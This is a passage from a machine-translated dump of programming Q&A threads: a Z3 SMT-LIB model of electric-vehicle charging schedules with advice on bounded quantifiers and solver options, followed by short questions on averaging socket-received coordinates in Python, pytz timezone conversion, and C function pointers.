     (= (VChargeAt 4 4) 0)))
(assert (and (= (VChargeAt 4 0) 0)
     (= (VChargeAt 4 1) 0)
     (= (VChargeAt 4 2) 0)
     (= (VChargeAt 4 3) 0)))

(assert (forall ((V Int)) (implies (and (>= V 1) (<= V 4)) (>= (VCapacity V) 10))))

(assert (forall ((V Int) (S Int))
  (implies (and (>= V 1) (<= V 4) (>= S 1) (<= S 8))
           (and (>= (VFunctionAt V S) 0) (<= (VFunctionAt V S) 3)))))

(assert (forall ((V Int) (S Int))
  (implies (and (and (>= V 1) (<= V 4) (>= S 1) (<= S 8))
                (or (and (>= S 1) (< S (VStartAt V)))
                    (and (> S (VEndAt V)) (<= S 8))))
           (= (VFunctionAt V S) 0))))

(assert (forall ((V Int) (S Int))
  (implies (and (>= V 1) (<= V 4) (>= S (VStartAt V)) (<= S (VEndAt V)))
           (and (implies (= (VFunctionAt V S) 0)
                         (= (VChargeAt V S) (VChargeAt V (- S 1))))
                (implies (= (VFunctionAt V S) 1)
                         (and (< (VChargeAt V (- S 1)) (VCapacity V))
                              (if (< (VCapacity V)
                                     (+ (VChargeAt V (- S 1)) (VCRate V)))
                                  (and (= (VChargeAt V S) (VCapacity V))
                                       (= (VCCharge V S)
                                          (- (VCapacity V)
                                             (VChargeAt V (- S 1)))))
                                  (and (= (VChargeAt V S)
                                          (+ (VChargeAt V (- S 1)) (VCRate V)))
                                       (= (VCCharge V S) (VCRate V))))))
                (implies (= (VFunctionAt V S) 2)
                         (and (> (VChargeAt V (- S 1)) 0)
                              (if (< (- (VChargeAt V (- S 1)) (VCRate V)) 0)
                                  (and (= (VChargeAt V S) 0)
                                       (= (VCDischarge V S)
                                          (VChargeAt V (- S 1))))
                                  (and (= (VChargeAt V S)
                                          (- (VChargeAt V (- S 1)) (VCRate V)))
                                       (= (VCDischarge V S) (VCRate V))))))
                (implies (= (VFunctionAt V S) 3)
                         (and (= (VChargeAt V S) (VChargeAt V (- S 1)))
                              (= (VCFReg V S) (VChargeAt V (- S 1)))))))))

(assert (forall ((V Int))
  (implies (and (>= V 1) (<= V 4)) (>= (VChargeAt V (VEndAt V)) (VChargeEnd V)))))

(assert (forall ((V Int) (S Int))
  (implies (and (>= V 1) (<= V 4) (>= S 1) (<= S 8))
           (and (implies (= (VFunctionAt V S) 0)
                         (and (= (VCCharge V S) 0)
                              (= (VCDischarge V S) 0)
                              (= (VCFReg V S) 0)))
                (implies (= (VFunctionAt V S) 1)
                         (and (> (VCCharge V S) 0)
                              (= (VCDischarge V S) 0)
                              (= (VCFReg V S) 0)))
                (implies (= (VFunctionAt V S) 2)
                         (and (= (VCCharge V S) 0)
                              (> (VCDischarge V S) 0)
                              (= (VCFReg V S) 0)))
                (implies (= (VFunctionAt V S) 3)
                         (and (= (VCCharge V S) 0)
                              (= (VCDischarge V S) 0)
                              (> (VCFReg V S) 0)))))))

(assert (= (TotalCChargeAt 1)
   (+ (VCCharge 1 1) (VCCharge 2 1) (VCCharge 3 1) (VCCharge 4 1))))
(assert (= (TotalCDischargeAt 1)
   (+ (VCDischarge 1 1) (VCDischarge 2 1) (VCDischarge 3 1) (VCDischarge 4 1))))
(assert (= (TotalCFRegAt 1) (+ (VCFReg 1 1) (VCFReg 2 1) (VCFReg 3 1) (VCFReg 4 1))))
(assert (= (TotalCChargeAt 2)
   (+ (VCCharge 1 2) (VCCharge 2 2) (VCCharge 3 2) (VCCharge 4 2))))
(assert (= (TotalCDischargeAt 2)
   (+ (VCDischarge 1 2) (VCDischarge 2 2) (VCDischarge 3 2) (VCDischarge 4 2))))
(assert (= (TotalCFRegAt 2) (+ (VCFReg 1 2) (VCFReg 2 2) (VCFReg 3 2) (VCFReg 4 2))))
(assert (= (TotalCChargeAt 3)
   (+ (VCCharge 1 3) (VCCharge 2 3) (VCCharge 3 3) (VCCharge 4 3))))
(assert (= (TotalCDischargeAt 3)
   (+ (VCDischarge 1 3) (VCDischarge 2 3) (VCDischarge 3 3) (VCDischarge 4 3))))
(assert (= (TotalCFRegAt 3) (+ (VCFReg 1 3) (VCFReg 2 3) (VCFReg 3 3) (VCFReg 4 3))))
(assert (= (TotalCChargeAt 4)
   (+ (VCCharge 1 4) (VCCharge 2 4) (VCCharge 3 4) (VCCharge 4 4))))
(assert (= (TotalCDischargeAt 4)
   (+ (VCDischarge 1 4) (VCDischarge 2 4) (VCDischarge 3 4) (VCDischarge 4 4))))
(assert (= (TotalCFRegAt 4) (+ (VCFReg 1 4) (VCFReg 2 4) (VCFReg 3 4) (VCFReg 4 4))))
(assert (= (TotalCChargeAt 5)
   (+ (VCCharge 1 5) (VCCharge 2 5) (VCCharge 3 5) (VCCharge 4 5))))
(assert (= (TotalCDischargeAt 5)
   (+ (VCDischarge 1 5) (VCDischarge 2 5) (VCDischarge 3 5) (VCDischarge 4 5))))
(assert (= (TotalCFRegAt 5) (+ (VCFReg 1 5) (VCFReg 2 5) (VCFReg 3 5) (VCFReg 4 5))))
(assert (= (TotalCChargeAt 6)
   (+ (VCCharge 1 6) (VCCharge 2 6) (VCCharge 3 6) (VCCharge 4 6))))
(assert (= (TotalCDischargeAt 6)
   (+ (VCDischarge 1 6) (VCDischarge 2 6) (VCDischarge 3 6) (VCDischarge 4 6))))
(assert (= (TotalCFRegAt 6) (+ (VCFReg 1 6) (VCFReg 2 6) (VCFReg 3 6) (VCFReg 4 6))))
(assert (= (TotalCChargeAt 7)
   (+ (VCCharge 1 7) (VCCharge 2 7) (VCCharge 3 7) (VCCharge 4 7))))
(assert (= (TotalCDischargeAt 7)
   (+ (VCDischarge 1 7) (VCDischarge 2 7) (VCDischarge 3 7) (VCDischarge 4 7))))
(assert (= (TotalCFRegAt 7) (+ (VCFReg 1 7) (VCFReg 2 7) (VCFReg 3 7) (VCFReg 4 7))))
(assert (= (TotalCChargeAt 8)
   (+ (VCCharge 1 8) (VCCharge 2 8) (VCCharge 3 8) (VCCharge 4 8))))
(assert (= (TotalCDischargeAt 8)
   (+ (VCDischarge 1 8) (VCDischarge 2 8) (VCDischarge 3 8) (VCDischarge 4 8))))
(assert (= (TotalCFRegAt 8) (+ (VCFReg 1 8) (VCFReg 2 8) (VCFReg 3 8) (VCFReg 4 8))))
(assert (and (or (= (TotalCFRegAt 1) 0) (>= (TotalCFRegAt 1) 20))
     (or (= (TotalCDischargeAt 1) 0)
         (and (<= (TotalCDischargeAt 1) 30) (>= (TotalCDischargeAt 1) 10)))
     (or (= (TotalCChargeAt 1) 0) (<= (TotalCChargeAt 1) 60))))
(assert (and (or (= (TotalCFRegAt 2) 0) (>= (TotalCFRegAt 2) 20))
     (or (= (TotalCDischargeAt 2) 0)
         (and (<= (TotalCDischargeAt 2) 30) (>= (TotalCDischargeAt 2) 10)))
     (or (= (TotalCChargeAt 2) 0) (<= (TotalCChargeAt 2) 60))))
(assert (and (or (= (TotalCFRegAt 3) 0) (>= (TotalCFRegAt 3) 20))
     (or (= (TotalCDischargeAt 3) 0)
         (and (<= (TotalCDischargeAt 3) 40) (>= (TotalCDischargeAt 3) 10)))
     (or (= (TotalCChargeAt 3) 0) (<= (TotalCChargeAt 3) 50))))
(assert (and (or (= (TotalCFRegAt 4) 0) (>= (TotalCFRegAt 4) 35))
     (or (= (TotalCDischargeAt 4) 0)
         (and (<= (TotalCDischargeAt 4) 30) (>= (TotalCDischargeAt 4) 10)))
     (or (= (TotalCChargeAt 4) 0) (<= (TotalCChargeAt 4) 30))))
(assert (and (or (= (TotalCFRegAt 5) 0) (>= (TotalCFRegAt 5) 25))
     (or (= (TotalCDischargeAt 5) 0)
         (and (<= (TotalCDischargeAt 5) 40) (>= (TotalCDischargeAt 5) 20)))
     (or (= (TotalCChargeAt 5) 0) (<= (TotalCChargeAt 5) 40))))
(assert (and (or (= (TotalCFRegAt 6) 0) (>= (TotalCFRegAt 6) 35))
     (or (= (TotalCDischargeAt 6) 0)
         (and (<= (TotalCDischargeAt 6) 40) (>= (TotalCDischargeAt 6) 10)))
     (or (= (TotalCChargeAt 6) 0) (<= (TotalCChargeAt 6) 40))))
(assert (and (or (= (TotalCFRegAt 7) 0) (>= (TotalCFRegAt 7) 20))
     (or (= (TotalCDischargeAt 7) 0)
         (and (<= (TotalCDischargeAt 7) 30) (>= (TotalCDischargeAt 7) 10)))
     (or (= (TotalCChargeAt 7) 0) (<= (TotalCChargeAt 7) 50))))
(assert (and (or (= (TotalCFRegAt 8) 0) (>= (TotalCFRegAt 8) 20))
     (or (= (TotalCDischargeAt 8) 0)
         (and (<= (TotalCDischargeAt 8) 30) (>= (TotalCDischargeAt 8) 10)))
     (or (= (TotalCChargeAt 8) 0) (<= (TotalCChargeAt 8) 60))))

(assert (= (+ (- (+ (* (TotalCDischargeAt 1) 1) (* (TotalCFRegAt 1) 1))
          (* (TotalCChargeAt 1) 1))
       (- (+ (* (TotalCDischargeAt 2) 1) (* (TotalCFRegAt 2) 1))
          (* (TotalCChargeAt 2) 1))
       (- (+ (* (TotalCDischargeAt 3) 1) (* (TotalCFRegAt 3) 1))
          (* (TotalCChargeAt 3) 1))
       (- (+ (* (TotalCDischargeAt 4) 2) (* (TotalCFRegAt 4) 2))
          (* (TotalCChargeAt 4) 2))
       (- (+ (* (TotalCDischargeAt 5) 2) (* (TotalCFRegAt 5) 1))
          (* (TotalCChargeAt 5) 2))
       (- (+ (* (TotalCDischargeAt 6) 2) (* (TotalCFRegAt 6) 2))
          (* (TotalCChargeAt 6) 2))
       (- (+ (* (TotalCDischargeAt 7) 1) (* (TotalCFRegAt 7) 1))
          (* (TotalCChargeAt 7) 1))
       (- (+ (* (TotalCDischargeAt 8) 1) (* (TotalCFRegAt 8) 1))
          (* (TotalCChargeAt 8) 1)))
    Total))

(assert (>= Total 350))

(check-sat)
(get-model) 
```

在我的形式化中，我主要使用未解释的函数。在这个例子中，我只显示了 4 辆车 (1<=V<= 4) 和 4 个时隙 (1<=S<=4)。在这里，在 unsat 结果的情况下，求解器花费的时间几乎是 sat 结果情况的 40 倍。当我们增加大小，例如6辆车和8个槽位（如下图），并将最小收益（即Total）设置为更大的值（例如，600），它会持续运行很长时间而不给出任何答案（期待一个不满意的结果）。但是，在饱和情况下（最低收益较低），Z3 需要几秒钟。由于车辆/插槽数量的小幅增加，sat 和 unsat 情况下的性能显着降低，尽管 unsat 情况下的性能很糟糕。

```
(set-option :relevancy 0)

(declare-fun VCapacity (Int) Int)
(declare-fun VChargeInit (Int) Int)
(declare-fun VChargeEnd (Int) Int)
(declare-fun VStartAt (Int) Int)
(declare-fun VEndAt (Int) Int)
(declare-fun VCRate (Int) Int)
(declare-fun VChargeAt (Int Int) Int)
(declare-fun VFunctionAt (Int Int) Int)
(declare-fun VCCharge (Int Int) Int)
(declare-fun VCDischarge (Int Int) Int)
(declare-fun VCFReg (Int Int) Int)
(declare-fun TotalCChargeAt (Int) Int)
(declare-fun TotalCDischargeAt (Int) Int)
(declare-fun TotalCFRegAt (Int) Int)

(declare-const Total Int)

; Input to the model
(assert (and (= (VStartAt 1) 1)
     (= (VEndAt 1) 4)
     (= (VCapacity 1) 30)
     (= (VChargeEnd 1) 20)
     (= (VCRate 1) 10)
     (= (VChargeInit 1) 10)
     (= (VChargeAt 1 0) 10)))
(assert (and (= (VChargeAt 1 5) 0)
     (= (VChargeAt 1 6) 0)
     (= (VChargeAt 1 7) 0)
     (= (VChargeAt 1 8) 0)))
(assert (and (= (VStartAt 2) 2)
     (= (VEndAt 2) 7)
     (= (VCapacity 2) 40)
     (= (VChargeEnd 2) 30)
     (= (VCRate 2) 10)
     (= (VChargeInit 2) 20)
     (= (VChargeAt 2 1) 20)))
(assert (and (= (VChargeAt 2 0) 0) (= (VChargeAt 2 8) 0)))
(assert (and (= (VStartAt 3) 4)
     (= (VEndAt 3) 6)
     (= (VCapacity 3) 20)
     (= (VChargeEnd 3) 20)
     (= (VCRate 3) 10)
     (= (VChargeInit 3) 10)
     (= (VChargeAt 3 3) 10)))
(assert (and (= (VChargeAt 3 0) 0)
     (= (VChargeAt 3 1) 0)
     (= (VChargeAt 3 2) 0)
     (= (VChargeAt 3 7) 0)
     (= (VChargeAt 3 8) 0)))
(assert (and (= (VStartAt 4) 5)
     (= (VEndAt 4) 8)
     (= (VCapacity 4) 30)
     (= (VChargeEnd 4) 20)
     (= (VCRate 4) 10)
     (= (VChargeInit 4) 0)
     (= (VChargeAt 4 4) 0)))
(assert (and (= (VChargeAt 4 0) 0)
     (= (VChargeAt 4 1) 0)
     (= (VChargeAt 4 2) 0)
     (= (VChargeAt 4 3) 0)))
(assert (and (= (VStartAt 5) 2)
     (= (VEndAt 5) 6)
     (= (VCapacity 5) 20)
     (= (VChargeEnd 5) 20)
     (= (VCRate 5) 10)
     (= (VChargeInit 5) 10)
     (= (VChargeAt 5 1) 10)))
(assert (and (= (VChargeAt 5 0) 0) (= (VChargeAt 5 7) 0) (= (VChargeAt 5 8) 0)))
(assert (and (= (VStartAt 6) 4)
     (= (VEndAt 6) 7)
     (= (VCapacity 6) 30)
     (= (VChargeEnd 6) 20)
     (= (VCRate 6) 10)
     (= (VChargeInit 6) 0)
     (= (VChargeAt 6 3) 0)))
(assert (and (= (VChargeAt 6 0) 0)
     (= (VChargeAt 6 1) 0)
     (= (VChargeAt 6 2) 0)
     (= (VChargeAt 6 8) 0)))

; A vehicle battery's capacity should be greater than some threshold value     
(assert (forall ((V Int)) (implies (and (>= V 1) (<= V 6)) (>= (VCapacity V) 10))))

; A vehicle has 4 options (0 to 3) as its function
(assert (forall ((V Int) (S Int))
  (implies (and (>= V 1) (<= V 6) (>= S 1) (<= S 8))
           (and (>= (VFunctionAt V S) 0) (<= (VFunctionAt V S) 3)))))

; For slots before and after the available period, the function is 0 (idle)           
(assert (forall ((V Int) (S Int))
  (implies (and (and (>= V 1) (<= V 6) (>= S 1) (<= S 8))
                (or (and (>= S 1) (< S (VStartAt V)))
                    (and (> S (VEndAt V)) (<= S 8))))
           (= (VFunctionAt V S) 0))))

; Update the vehicle's stored energy/charge           
(assert (forall ((V Int) (S Int))
  (implies (and (>= V 1) (<= V 6) (>= S (VStartAt V)) (<= S (VEndAt V)))
           (and (implies (= (VFunctionAt V S) 0)
                         (= (VChargeAt V S) (VChargeAt V (- S 1))))
                (implies (= (VFunctionAt V S) 1)
                         (and (< (VChargeAt V (- S 1)) (VCapacity V))
                              (if (< (VCapacity V)
                                     (+ (VChargeAt V (- S 1)) (VCRate V)))
                                  (and (= (VChargeAt V S) (VCapacity V))
                                       (= (VCCharge V S)
                                          (- (VCapacity V)
                                             (VChargeAt V (- S 1)))))
                                  (and (= (VChargeAt V S)
                                          (+ (VChargeAt V (- S 1)) (VCRate V)))
                                       (= (VCCharge V S) (VCRate V))))))
                (implies (= (VFunctionAt V S) 2)
                         (and (> (VChargeAt V (- S 1)) 0)
                              (if (< (- (VChargeAt V (- S 1)) (VCRate V)) 0)
                                  (and (= (VChargeAt V S) 0)
                                       (= (VCDischarge V S)
                                          (VChargeAt V (- S 1))))
                                  (and (= (VChargeAt V S)
                                          (- (VChargeAt V (- S 1)) (VCRate V)))
                                       (= (VCDischarge V S) (VCRate V))))))
                (implies (= (VFunctionAt V S) 3)
                         (and (= (VChargeAt V S) (VChargeAt V (- S 1)))
                              (= (VCFReg V S) (VChargeAt V (- S 1)))))))))

; stored charge at the end of the vehicle should be >= expected stored charge
(assert (forall ((V Int))
  (implies (and (>= V 1) (<= V 6)) (>= (VChargeAt V (VEndAt V)) (VChargeEnd V)))))

; Cases when the charged/discharged/capacity for frequency regulation is zero
(assert (forall ((V Int) (S Int))
  (implies (and (>= V 1) (<= V 6) (>= S 1) (<= S 8))
           (and (implies (= (VFunctionAt V S) 0)
                         (and (= (VCCharge V S) 0)
                              (= (VCDischarge V S) 0)
                              (= (VCFReg V S) 0)))
                (implies (= (VFunctionAt V S) 1)
                         (and (> (VCCharge V S) 0)
                              (= (VCDischarge V S) 0)
                              (= (VCFReg V S) 0)))
                (implies (= (VFunctionAt V S) 2)
                         (and (= (VCCharge V S) 0)
                              (> (VCDischarge V S) 0)
                              (= (VCFReg V S) 0)))
                (implies (= (VFunctionAt V S) 3)
                         (and (= (VCCharge V S) 0)
                              (= (VCDischarge V S) 0)
                              (> (VCFReg V S) 0)))))))

; Summation of the total charged/discharged/frequency regulation at each time slot
(assert (= (TotalCChargeAt 1)
   (+ (VCCharge 1 1) 
      (VCCharge 2 1)
      (VCCharge 3 1)
      (VCCharge 4 1)
      (VCCharge 5 1)
      (VCCharge 6 1))))
(assert (= (TotalCDischargeAt 1)
   (+ (VCDischarge 1 1)
      (VCDischarge 2 1)
      (VCDischarge 3 1)
      (VCDischarge 4 1)
      (VCDischarge 5 1)
      (VCDischarge 6 1))))
(assert (= (TotalCFRegAt 1)
   (+ (VCFReg 1 1)
      (VCFReg 2 1)
      (VCFReg 3 1)
      (VCFReg 4 1)
      (VCFReg 5 1)
      (VCFReg 6 1))))
(assert (= (TotalCChargeAt 2)
   (+ (VCCharge 1 2)
      (VCCharge 2 2)
      (VCCharge 3 2)
      (VCCharge 4 2)
      (VCCharge 5 2)
      (VCCharge 6 2))))
(assert (= (TotalCDischargeAt 2)
   (+ (VCDischarge 1 2)
      (VCDischarge 2 2)
      (VCDischarge 3 2)
      (VCDischarge 4 2)
      (VCDischarge 5 2)
      (VCDischarge 6 2))))
(assert (= (TotalCFRegAt 2)
   (+ (VCFReg 1 2)
      (VCFReg 2 2)
      (VCFReg 3 2)
      (VCFReg 4 2)
      (VCFReg 5 2)
      (VCFReg 6 2))))
(assert (= (TotalCChargeAt 3)
   (+ (VCCharge 1 3)
      (VCCharge 2 3)
      (VCCharge 3 3)
      (VCCharge 4 3)
      (VCCharge 5 3)
      (VCCharge 6 3))))
(assert (= (TotalCDischargeAt 3)
   (+ (VCDischarge 1 3)
      (VCDischarge 2 3)
      (VCDischarge 3 3)
      (VCDischarge 4 3)
      (VCDischarge 5 3)
      (VCDischarge 6 3))))
(assert (= (TotalCFRegAt 3)
   (+ (VCFReg 1 3)
      (VCFReg 2 3)
      (VCFReg 3 3)
      (VCFReg 4 3)
      (VCFReg 5 3)
      (VCFReg 6 3))))
(assert (= (TotalCChargeAt 4)
   (+ (VCCharge 1 4)
      (VCCharge 2 4)
      (VCCharge 3 4)
      (VCCharge 4 4)
      (VCCharge 5 4)
      (VCCharge 6 4))))
(assert (= (TotalCDischargeAt 4)
   (+ (VCDischarge 1 4)
      (VCDischarge 2 4)
      (VCDischarge 3 4)
      (VCDischarge 4 4)
      (VCDischarge 5 4)
      (VCDischarge 6 4))))
(assert (= (TotalCFRegAt 4)
   (+ (VCFReg 1 4)
      (VCFReg 2 4)
      (VCFReg 3 4)
      (VCFReg 4 4)
      (VCFReg 5 4)
      (VCFReg 6 4))))
(assert (= (TotalCChargeAt 5)
   (+ (VCCharge 1 5)
      (VCCharge 2 5)
      (VCCharge 3 5)
      (VCCharge 4 5)
      (VCCharge 5 5)
      (VCCharge 6 5))))
(assert (= (TotalCDischargeAt 5)
   (+ (VCDischarge 1 5)
      (VCDischarge 2 5)
      (VCDischarge 3 5)
      (VCDischarge 4 5)
      (VCDischarge 5 5)
      (VCDischarge 6 5))))
(assert (= (TotalCFRegAt 5)
   (+ (VCFReg 1 5)
      (VCFReg 2 5)
      (VCFReg 3 5)
      (VCFReg 4 5)
      (VCFReg 5 5)
      (VCFReg 6 5))))
(assert (= (TotalCChargeAt 6)
   (+ (VCCharge 1 6)
      (VCCharge 2 6)
      (VCCharge 3 6)
      (VCCharge 4 6)
      (VCCharge 5 6)
      (VCCharge 6 6))))
(assert (= (TotalCDischargeAt 6)
   (+ (VCDischarge 1 6)
      (VCDischarge 2 6)
      (VCDischarge 3 6)
      (VCDischarge 4 6)
      (VCDischarge 5 6)
      (VCDischarge 6 6))))
(assert (= (TotalCFRegAt 6)
   (+ (VCFReg 1 6)
      (VCFReg 2 6)
      (VCFReg 3 6)
      (VCFReg 4 6)
      (VCFReg 5 6)
      (VCFReg 6 6))))
(assert (= (TotalCChargeAt 7)
   (+ (VCCharge 1 7)
      (VCCharge 2 7)
      (VCCharge 3 7)
      (VCCharge 4 7)
      (VCCharge 5 7)
      (VCCharge 6 7))))
(assert (= (TotalCDischargeAt 7)
   (+ (VCDischarge 1 7)
      (VCDischarge 2 7)
      (VCDischarge 3 7)
      (VCDischarge 4 7)
      (VCDischarge 5 7)
      (VCDischarge 6 7))))
(assert (= (TotalCFRegAt 7)
   (+ (VCFReg 1 7)
      (VCFReg 2 7)
      (VCFReg 3 7)
      (VCFReg 4 7)
      (VCFReg 5 7)
      (VCFReg 6 7))))
(assert (= (TotalCChargeAt 8)
   (+ (VCCharge 1 8)
      (VCCharge 2 8)
      (VCCharge 3 8)
      (VCCharge 4 8)
      (VCCharge 5 8)
      (VCCharge 6 8))))
(assert (= (TotalCDischargeAt 8)
   (+ (VCDischarge 1 8)
      (VCDischarge 2 8)
      (VCDischarge 3 8)
      (VCDischarge 4 8)
      (VCDischarge 5 8)
      (VCDischarge 6 8))))
(assert (= (TotalCFRegAt 8)
   (+ (VCFReg 1 8)
      (VCFReg 2 8)
      (VCFReg 3 8)
      (VCFReg 4 8)
      (VCFReg 5 8)
      (VCFReg 6 8))))

; Constraints      
(assert (and (or (= (TotalCFRegAt 1) 0) (>= (TotalCFRegAt 1) 20))
     (or (= (TotalCDischargeAt 1) 0)
         (and (<= (TotalCDischargeAt 1) 40) (>= (TotalCDischargeAt 1) 10)))
     (or (= (TotalCChargeAt 1) 0) (<= (TotalCChargeAt 1) 70))))
(assert (and (or (= (TotalCFRegAt 2) 0) (>= (TotalCFRegAt 2) 20))
     (or (= (TotalCDischargeAt 2) 0)
         (and (<= (TotalCDischargeAt 2) 40) (>= (TotalCDischargeAt 2) 10)))
     (or (= (TotalCChargeAt 2) 0) (<= (TotalCChargeAt 2) 70))))
(assert (and (or (= (TotalCFRegAt 3) 0) (>= (TotalCFRegAt 3) 20))
     (or (= (TotalCDischargeAt 3) 0)
         (and (<= (TotalCDischargeAt 3) 50) (>= (TotalCDischargeAt 3) 10)))
     (or (= (TotalCChargeAt 3) 0) (<= (TotalCChargeAt 3) 60))))
(assert (and (or (= (TotalCFRegAt 4) 0) (>= (TotalCFRegAt 4) 35))
     (or (= (TotalCDischargeAt 4) 0)
         (and (<= (TotalCDischargeAt 4) 40) (>= (TotalCDischargeAt 4) 10)))
     (or (= (TotalCChargeAt 4) 0) (<= (TotalCChargeAt 4) 40))))
(assert (and (or (= (TotalCFRegAt 5) 0) (>= (TotalCFRegAt 5) 25))
     (or (= (TotalCDischargeAt 5) 0)
         (and (<= (TotalCDischargeAt 5) 50) (>= (TotalCDischargeAt 5) 20)))
     (or (= (TotalCChargeAt 5) 0) (<= (TotalCChargeAt 5) 50))))
(assert (and (or (= (TotalCFRegAt 6) 0) (>= (TotalCFRegAt 6) 35))
     (or (= (TotalCDischargeAt 6) 0)
         (and (<= (TotalCDischargeAt 6) 50) (>= (TotalCDischargeAt 6) 10)))
     (or (= (TotalCChargeAt 6) 0) (<= (TotalCChargeAt 6) 50))))
(assert (and (or (= (TotalCFRegAt 7) 0) (>= (TotalCFRegAt 7) 20))
     (or (= (TotalCDischargeAt 7) 0)
         (and (<= (TotalCDischargeAt 7) 40) (>= (TotalCDischargeAt 7) 10)))
     (or (= (TotalCChargeAt 7) 0) (<= (TotalCChargeAt 7) 60))))
(assert (and (or (= (TotalCFRegAt 8) 0) (>= (TotalCFRegAt 8) 20))
     (or (= (TotalCDischargeAt 8) 0)
         (and (<= (TotalCDischargeAt 8) 40) (>= (TotalCDischargeAt 8) 10)))
     (or (= (TotalCChargeAt 8) 0) (<= (TotalCChargeAt 8) 70))))

(assert (= (+ (- (+ (* (TotalCDischargeAt 1) 1) (* (TotalCFRegAt 1) 1))
          (* (TotalCChargeAt 1) 1))
       (- (+ (* (TotalCDischargeAt 2) 1) (* (TotalCFRegAt 2) 1))
          (* (TotalCChargeAt 2) 1))
       (- (+ (* (TotalCDischargeAt 3) 1) (* (TotalCFRegAt 3) 1))
          (* (TotalCChargeAt 3) 1))
       (- (+ (* (TotalCDischargeAt 4) 2) (* (TotalCFRegAt 4) 2))
          (* (TotalCChargeAt 4) 2))
       (- (+ (* (TotalCDischargeAt 5) 2) (* (TotalCFRegAt 5) 1))
          (* (TotalCChargeAt 5) 2))
       (- (+ (* (TotalCDischargeAt 6) 2) (* (TotalCFRegAt 6) 2))
          (* (TotalCChargeAt 6) 2))
       (- (+ (* (TotalCDischargeAt 7) 1) (* (TotalCFRegAt 7) 1))
          (* (TotalCChargeAt 7) 1))
       (- (+ (* (TotalCDischargeAt 8) 1) (* (TotalCFRegAt 8) 1))
          (* (TotalCChargeAt 8) 1)))
    Total))

(assert (>= Total 500))

(check-sat)
(get-model) 
```

我想知道我的形式化是否效率不高或者我要解决的问题很复杂。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T16:21:49.710

不，一般来说，Z3 不会在不满意的情况下花费更长的时间。这是您的问题的一个特殊特征。实际上，对于包含量词的问题，Z3 通常需要更长的时间才能返回`sat`。对于包含量词的问题，Z3 可能经常返回`unknown`可满足的实例。[Z3 指南](http://rise4fun.com/Z3/tutorial/guide)描述了许多类别的问题（包含量词），其中 Z3 能够返回`sat`可满足的实例。在您的问题中，您仅使用有界量词。因此，您处于 Z3 支持的可判定片段中。

Z3 中用于处理量词的启发式算法并未针对仅使用有界量词的问题进行调整。在我的机器上，我只使用选项就获得了 4 倍的时间加速`RELEVANCY=0`。您还可以通过`(set-option :relevancy 0)`在 SMT2 文件中添加命令来设置此选项。在编程 API 中，您可以在创建逻辑上下文时设置此选项。

其次，量词并不是真正需要对您的问题进行编码。您可以使用编程 API 轻松生成所有需要的实例。这是一个使用 Python API 的小例子（也在[http://rise4fun.com/Z3Py/yzcX](http://rise4fun.com/Z3Py/yzcX)）。

```
VFunctionAt = Function('VFunctionAt', IntSort(), IntSort(), IntSort())

s = Solver()
s.add([VFunctionAt(V,S) >= 0 for V in range(1, 5) for S in range(1, 9)])
print s 
```

在这个例子中，我本质上是在编码`forall V in [1,4] S in [1,8] VFunctionAt(V,S) >= 0`. 通过扩展量词，您可以在很多方面帮助 Z3：它不必在搜索期间扩展量词；它将对问题使用正确的启发式方法（因为问题将是无量词的）；它不必检查 Z3 正在构建的模型/解决方案是否真的满足量化公式。

未来，我们计划在 Z3 中添加对检测这种所有量词有界的问题实例的支持，并自动为用户执行此转换。

# python - 如何获得三个 pos_coordinates 值的平均值？

> ID：12659102
> 
> 赞同：0
> 
> 时间：2012-09-30T06:08:38.793
> 
> 标签：python

```
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((HOST,PORT))

    screen_width = 0
    screen_height = 0

    while True:
        client_socket.send("loc\n")
        data = client_socket.recv(8192)
        pos_coordinates = data.split()

        if(not(pos_coordinates[-1] == "eom" and pos_coordinates[0] == "start")):
            continue

        if (screenw != int(pos_coordinates[2])):
            screenw = int(pos_coordinates[2])
            screenh = int(pos_coordinates[3])

        blalba(pos_coordinates) 
```

如何获得 3 个 pos_coordinates 列表值的平均值？例如，如果 pos_coordinates[8] 包含值 345，我想获得该值的平均值并使用平均值。我想这样做的原因是因为我从通过相机检测到的图像中得到了噪音，我认为最好的方法是获取这些值的平均值以获得我想要的值。有关如何执行此操作的任何示例？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T06:29:13.693

获取整个列表的平均值；

```
average = float(sum(pos_coordinates))/len(pos_coordinates) 
```

如果您只想获得子集的平均值，请使用切片；

```
subset = pos_coordinates[3:9]
average = float(sum(subset))/len(subset) 
```

在 python 3.x 中，`float`不再需要显式转换来获得准确的除法。

# python - 使用 Python 将不明确的时间转换为正确的本地时间

> ID：12659108
> 
> 赞同：0
> 
> 时间：2012-09-30T06:10:24.373
> 
> 标签：python, datetime, dst

我正在努力解决 Python 中看似常见的时区问题，但无法解决它或找到我在 SO 上遇到的确切问题，所以我提出以下问题。

我有一个没有设置时区的时间元组。我也有一个时区。我的电脑在不同的时区。考虑到夏令时，如何将时间转换为当地时间？

```
>>> type(dt.value)
<type 'datetime.datetime'>
>>> print dt.timetuple()
time.struct_time(tm_year=2012, tm_mon=6, tm_mday=28, ..., tm_isdst=-1)
>>> print somezone.zone
America/New_York 
```

如果我将区域信息添加到`dt`如下所示，则 DST 处理不正确......`tm_isdst`始终显示为零，无论月份是否处于 DST 中。

```
dt.value = dt.value.replace(tzinfo=somezone)
>>> print dt.timetuple()
time.struct_time(tm_year=2012, tm_mon=6, tm_mday=28, ..., tm_isdst=0) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T06:12:45.153

使用[`pytz`](http://pytz.sourceforge.net/)图书馆。它会让你轻松做到这一点。

```
from pytz import timezone
zone_tz = timezone(zone)
zone_aware_dt = zone_tz.localize(dt)
local_tz = timezone("America/Los_Angeles")
local_dt = local_tz.normalize(zone_aware_dt) 
```

# c - 如何在 C 中执行条件函数调用？

> ID：12659109
> 
> 赞同：1
> 
> 时间：2012-09-30T06:10:39.880
> 
> 标签：c, function-pointers, conditional-compilation

所以我在 C 中做一些工作，我在汇编和 C 中都实现了相同的功能，我想比较 C 和汇编实现的性能。现在，我希望能够有条件地编译和调用该函数，即我想创建一个函数，该函数将充当调用者和我想要调用的正确函数之间的接口。不知何故，我不知道该怎么做。我在考虑以下几点：

```
//header file containing the C definition and the assembly definition

void getstate(state* m, int* values);   
extern void kalmanstate(state* m, int* values); 
```

然后调用者可以包含上述头文件并传递 &getstate 或 &kalmanstate。

```
void callTheRightFunction(state* m, int* values, void *fnptr(state*,int*))
{
  *fnptr(m,values);
} 
```

